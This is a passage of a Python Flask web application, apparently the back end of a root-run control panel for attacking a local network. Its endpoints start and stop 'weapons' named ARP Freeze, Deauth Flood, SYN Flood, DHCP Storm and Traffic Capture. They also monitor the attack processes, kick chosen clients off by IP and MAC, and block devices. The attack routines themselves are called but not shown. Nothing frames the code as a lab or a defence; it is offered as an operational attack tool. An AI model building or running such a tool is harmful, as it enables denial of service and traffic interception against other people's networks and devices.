        return jsonify({'success': False, 'error': 'Gateway not set'})
    if weapon in STATE['attack_pids']:
        kill_attack(STATE['attack_pids'][weapon])
        del STATE['attack_pids'][weapon]
    try:
        pids = run_attack(weapon, STATE['targets'], STATE['gateway'], STATE['port'], STATE['interface'])
        if not pids:
            raise RuntimeError('Attack launcher returned no processes')
        with STATE_LOCK:
            STATE['attack_pids'][weapon] = pids
            STATE['attack_status'][weapon] = 'running'
        weapon_names = {1:'ARP Freeze',2:'Deauth Flood',3:'SYN Flood',4:'DHCP Storm',5:'Traffic Capture'}
        add_log('success', f'Attack started: {weapon_names[weapon]}')
        def liveness(weapon_id, proc_list):
            time.sleep(2)
            if any(p.poll() is not None for p in proc_list):
                with STATE_LOCK:
                    STATE['attack_status'][weapon_id] = 'dead'
                add_log('error', f'Attack {weapon_names[weapon_id]} died unexpectedly')
        threading.Thread(target=liveness, args=(weapon, pids), daemon=True).start()
        return jsonify({'success': True, 'weapon': weapon_names[weapon]})
    except Exception as e:
        add_log('error', f'Attack start failed: {str(e)}')
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/stop_attack', methods=['POST'])
@require_auth
def api_stop_attack():
    with STATE_LOCK:
        for weapon, pids in list(STATE['attack_pids'].items()):
            kill_attack(pids)
        STATE['attack_pids'].clear()
        STATE['attack_status'] = {}
        if STATE['monitor_log_path']:
            try:
                os.unlink(STATE['monitor_log_path'])
            except:
                pass
            STATE['monitor_log_path'] = None
    if STATE['interface']:
        set_monitor(STATE['interface'], False)
    add_log('info', 'All attacks stopped')
    return jsonify({'success': True, 'status': 'All attacks stopped'})

@app.route('/api/attack_status', methods=['GET'])
@require_auth
def api_attack_status():
    with STATE_LOCK:
        for weapon, pids in STATE['attack_pids'].items():
            if any(p.poll() is not None for p in pids):
                STATE['attack_status'][weapon] = 'dead'
            else:
                STATE['attack_status'][weapon] = 'running'
        attacks = {weapon: (STATE['attack_status'].get(weapon) == 'running') for weapon in STATE['attack_pids']}
    return jsonify({'attacks': attacks})

@app.route('/api/monitor_log', methods=['GET'])
@require_auth
def api_monitor_log():
    lines = STATE.get('monitor_log', [])
    return jsonify({'lines': lines[-50:]})

@app.route('/api/check_reachability', methods=['GET'])
@require_auth
def api_check_reachability():
    ip = request.args.get('ip')
    if not ip or not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
        return jsonify({'reachable': False, 'error': 'Invalid IP'})
    start = time.time()
    reachable = server_ping(ip)
    latency = int((time.time() - start) * 1000) if reachable else None
    return jsonify({'reachable': reachable, 'latency': latency})

@app.route('/api/kick', methods=['POST'])
@require_auth
def api_kick():
    data = request.json
    ip = data.get('ip')
    if not ip:
        return jsonify({'success': False, 'status': 'No IP provided'})
    mac = None
    for h in STATE['hosts']:
        if h['ip'] == ip:
            mac = h['mac']
            break
    if not mac:
        return jsonify({'success': False, 'status': 'MAC not found for IP'})
    if not STATE['interface']:
        return jsonify({'success': False, 'status': 'Interface not set'})
    try:
        kicked = kick_client(ip, mac, STATE['interface'])
        if kicked:
            add_log('success', f'Kicked {ip} ({mac})')
            return jsonify({'success': True, 'status': f'Kicked {ip} ({mac})'})
        else:
            add_log('warn', f'Kick {ip} attempted but target still responding')
            return jsonify({'success': False, 'status': f'Kick {ip} attempted but target still responding'})
    except Exception as e:
        add_log('error', f'Kick failed: {str(e)}')
        return jsonify({'success': False, 'status': str(e)})

@app.route('/api/block', methods=['POST'])
@require_auth
def api_block():
    data = request.json
    ip = data.get('ip')
    if not ip:
        return jsonify({'success': False, 'status': 'No IP provided'})
    mac = None
    for h in STATE['hosts']:
        if h['ip'] == ip:
            mac = h['mac']
            break
    if not mac:
        return jsonify({'success': False, 'status': 'MAC not found'})
    try:
        blocked = block_mac(mac)
        msg = 'Blocked' if blocked else 'Unblocked'
        return jsonify({'success': True, 'status': f'{msg} {mac}'})
    except Exception as e:
        add_log('error', f'Block failed: {str(e)}')
        return jsonify({'success': False, 'status': str(e)})

@app.route('/api/logs', methods=['GET'])
@require_auth
def api_logs():
    with STATE_LOCK:
        return jsonify({'logs': STATE['log']})

@app.route('/api/clear_logs', methods=['POST'])
@require_auth
def api_clear_logs():
    with STATE_LOCK:
        STATE['log'] = []
    add_log('info', 'Server log cleared')
    return jsonify({'success': True})

@app.route('/api/add_log', methods=['POST'])
@require_auth
def api_add_log():
    data = request.json
    level = data.get('level', 'info')
    msg = data.get('msg', '')
    add_log(level, msg)
    return jsonify({'success': True})

# ---------- bootstrap ----------
if __name__ == '__main__':
    if os.geteuid() != 0:
        print("WARNING: Not running as root. Some features (raw sockets, iptables) may fail.")
    ensure_tool('iw')
    ensure_tool('iptables')
    app.run(host='0.0.0.0', port=APP_PORT, debug=False)
